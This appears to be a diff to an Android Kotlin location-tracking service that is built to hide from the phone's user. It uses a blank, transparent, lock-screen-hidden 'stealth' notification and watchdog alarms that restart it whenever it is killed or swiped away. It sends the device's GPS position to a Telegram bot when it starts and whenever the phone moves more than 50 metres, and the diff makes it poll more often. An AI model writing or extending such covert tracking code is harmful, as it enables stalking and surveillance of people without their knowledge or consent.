@@ -41,18 +41,18 @@ class LocationTrackingService : Service() {
 
         private const val ALERT_DISTANCE_METERS      = 50f
         private const val TELEGRAM_INTERVAL_MS       = 5 * 60 * 1000L
-        private const val LOCATION_INTERVAL_MS       = 30_000L
-        private const val LOCATION_FASTEST_MS        = 15_000L
-        private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L   // 10 min
+        private const val LOCATION_INTERVAL_MS       = 15_000L   // poll every 15 s
+        private const val LOCATION_FASTEST_MS        = 5_000L
+        private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L
     }
 
     private lateinit var fusedClient: FusedLocationProviderClient
     private lateinit var locationCallback: LocationCallback
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
+    // True once the first "I'm online + location" message has been sent this session
+    private var sentInitialLocation = false
     private var startLocation: Location? = null
-    private var isBootStart = false
-    private var bootLocationSent = false
 
     // ─── Lifecycle ────────────────────────────────────────────────────────────
 
@@ -66,40 +66,45 @@ class LocationTrackingService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(NOTIFICATION_ID, buildStealthNotification())
 
-        isBootStart = intent?.getBooleanExtra(EXTRA_BOOT_START, false) ?: false
-
         val prefs = prefs()
         prefs.edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()
 
-        bootLocationSent = prefs.getBoolean(Prefs.KEY_BOOT_LOCATION_SENT, !isBootStart)
-
-        // Restore a previously-locked start location (survives service restarts)
-        val savedLat = prefs.getFloat(Prefs.KEY_START_LAT, Float.MIN_VALUE)
-        val savedLng = prefs.getFloat(Prefs.KEY_START_LNG, Float.MIN_VALUE)
-        if (savedLat != Float.MIN_VALUE && startLocation == null) {
-            startLocation = Location("saved").apply {
-                latitude  = savedLat.toDouble()
-                longitude = savedLng.toDouble()
+        // Restore start location saved from a previous session so we keep
+        // tracking relative to the same origin across service restarts / reboots.
+        if (startLocation == null) {
+            val savedLat = prefs.getFloat(Prefs.KEY_START_LAT, 0f)
+            val savedLng = prefs.getFloat(Prefs.KEY_START_LNG, 0f)
+            if (savedLat != 0f || savedLng != 0f) {
+                startLocation = Location("saved").apply {
+                    latitude  = savedLat.toDouble()
+                    longitude = savedLng.toDouble()
+                }
+                // Start location already established — skip the initial "online" message
+                sentInitialLocation = true
             }
         }
 
         scheduleWatchdogs()
+
+        // Try to get an instant last-known fix so we don't wait for the first
+        // GPS poll (which can take up to 15 s on a cold start).
+        tryLastKnownLocation()
+
         startLocationUpdates()
 
-        Log.d(TAG, "Service started (bootStart=$isBootStart)")
+        Log.d(TAG, "Service started — sentInitial=$sentInitialLocation")
         return START_STICKY
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        // App was swiped away — schedule an immediate alarm to restart
-        Log.d(TAG, "Task removed — scheduling restart alarm")
+        Log.d(TAG, "Task removed — scheduling restart")
         scheduleImmediateRestart()
         super.onTaskRemoved(rootIntent)
     }
 
     override fun onDestroy() {
-        Log.d(TAG, "onDestroy — will be restarted by watchdog")
-        fusedClient.removeLocationUpdates(locationCallback)
+        Log.d(TAG, "onDestroy — watchdog will restart")
+        try { fusedClient.removeLocationUpdates(locationCallback) } catch (_: Exception) {}
         scope.cancel()
         scheduleImmediateRestart()
         super.onDestroy()
@@ -108,6 +113,16 @@ class LocationTrackingService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     // ─── Location ─────────────────────────────────────────────────────────────
+
+    @Suppress("MissingPermission")
+    private fun tryLastKnownLocation() {
+        fusedClient.lastLocation.addOnSuccessListener { location ->
+            if (location != null) {
+                Log.d(TAG, "Last-known location: ${location.latitude}, ${location.longitude}")
+                onNewLocation(location)
+            }
+        }
+    }
 
     private fun buildLocationCallback() {
         locationCallback = object : LocationCallback() {
@@ -126,60 +141,54 @@ class LocationTrackingService : Service() {
     }
 
     private fun onNewLocation(location: Location) {
-        // Persist latest fix
+        // ── Step 1: Send the first "online + location" message ────────────────
+        if (!sentInitialLocation) {
+            sentInitialLocation = true
+            startLocation = location
+
+            prefs().edit()
+                .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
+                .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
+                .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
+                .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
+                .apply()
+
+            val (token, chatId) = credentials()
+            scope.launch {
+                TelegramApi.sendMessage(
+                    token, chatId,
+                    TelegramApi.buildOnlineWithLocationMessage(
+                        location.latitude, location.longitude, location.accuracy
+                    )
+                )
+            }
+            return
+        }
+
+        // ── Step 2: Periodic movement alerts ─────────────────────────────────
         prefs().edit()
             .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
             .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
             .apply()
 
-        // First fix — send "phone online + location" message if this was a boot start
-        if (!bootLocationSent) {
-            bootLocationSent = true
-            prefs().edit().putBoolean(Prefs.KEY_BOOT_LOCATION_SENT, true).apply()
-            val (token, chatId) = credentials()
-            if (token.isNotBlank() && chatId.isNotBlank()) {
-                scope.launch {
-                    TelegramApi.sendMessage(
-                        token, chatId,
-                        TelegramApi.buildOnlineWithLocationMessage(
-                            location.latitude, location.longitude, location.accuracy
-                        )
-                    )
-                }
-            }
-        }
-
-        // Lock starting point on very first fix of this session
-        if (startLocation == null) {
-            startLocation = location
-            prefs().edit()
-                .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
-                .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
-                .apply()
-            Log.d(TAG, "Start location locked: ${location.latitude}, ${location.longitude}")
-            return
-        }
-
-        val distance = startLocation!!.distanceTo(location)
+        val origin = startLocation ?: return
+        val distance = origin.distanceTo(location)
         prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()
 
-        // Send periodic alert when beyond threshold
         if (distance >= ALERT_DISTANCE_METERS) {
             val p = prefs()
             val lastSent = p.getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
             val now = System.currentTimeMillis()
             if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                 val (token, chatId) = credentials()
-                if (token.isNotBlank() && chatId.isNotBlank()) {
-                    scope.launch {
-                        val sent = TelegramApi.sendMessage(
-                            token, chatId,
-                            TelegramApi.buildLocationMessage(
-                                location.latitude, location.longitude, distance, location.accuracy
-                            )
+                scope.launch {
+                    val ok = TelegramApi.sendMessage(
+                        token, chatId,
+                        TelegramApi.buildLocationMessage(
+                            location.latitude, location.longitude, distance, location.accuracy
                         )
-                        if (sent) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
-                    }
+                    )
+                    if (ok) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                 }
             }
         }
@@ -188,55 +197,42 @@ class LocationTrackingService : Service() {
     // ─── Watchdogs ────────────────────────────────────────────────────────────
 
     private fun scheduleWatchdogs() {
-        // 1. WorkManager — survives across reboots
-        val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES)
-            .build()
+        // WorkManager — persists across reboots, minimum 15-min interval
+        val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
         WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "loc_watchdog",
-            ExistingPeriodicWorkPolicy.KEEP,
-            workReq
+            "loc_watchdog", ExistingPeriodicWorkPolicy.KEEP, workReq
         )
-
-        // 2. AlarmManager — fires every 10 minutes while device is awake
+        // AlarmManager — more frequent while device is awake
         scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
     }
 
-    private fun scheduleImmediateRestart() {
-        scheduleWatchdogAlarm(5_000L)   // 5 seconds
-    }
+    private fun scheduleImmediateRestart() = scheduleWatchdogAlarm(3_000L)
 
     private fun scheduleWatchdogAlarm(delayMs: Long) {
         val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        val intent = Intent(this, WatchdogReceiver::class.java).apply {
-            action = WatchdogReceiver.ACTION_WATCHDOG
-        }
         val pi = PendingIntent.getBroadcast(
-            this, 0, intent,
+            this, 0,
+            Intent(this, WatchdogReceiver::class.java).apply {
+                action = WatchdogReceiver.ACTION_WATCHDOG
+            },
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         try {
             am.setExactAndAllowWhileIdle(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + delayMs,
-                pi
+                SystemClock.elapsedRealtime() + delayMs, pi
             )
-        } catch (e: SecurityException) {
-            // Exact alarms require SCHEDULE_EXACT_ALARM on Android 12+; fall back to inexact
-            am.set(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + delayMs,
-                pi
-            )
+        } catch (_: SecurityException) {
+            am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                SystemClock.elapsedRealtime() + delayMs, pi)
         }
     }
 
     // ─── Stealth notification ─────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel(
-            CHANNEL_ID,
-            " ",                                        // blank name — invisible in Settings
-            NotificationManager.IMPORTANCE_MIN          // lowest — no status-bar icon ever
+        val ch = NotificationChannel(
+            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_MIN
         ).apply {
             description = ""
             setShowBadge(false)
@@ -245,20 +241,19 @@ class LocationTrackingService : Service() {
             enableVibration(false)
         }
         (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-            .createNotificationChannel(channel)
+            .createNotificationChannel(ch)
     }
 
-    private fun buildStealthNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")                        // no title
-            .setContentText("")                         // no text
-            .setSmallIcon(R.drawable.ic_transparent)   // fully transparent icon
+    private fun buildStealthNotification(): Notification =
+        NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(R.drawable.ic_transparent)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)   // hidden on lock screen
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setOngoing(true)
             .setSilent(true)
             .build()
-    }
 
     // ─── Helpers ──────────────────────────────────────────────────────────────
 
@@ -266,8 +261,7 @@ class LocationTrackingService : Service() {
 
     private fun credentials(): Pair<String, String> {
         val p = prefs()
-        val token  = p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
-        val chatId = p.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
-        return token to chatId
+        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN) to
+               (p.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID)
     }
 }
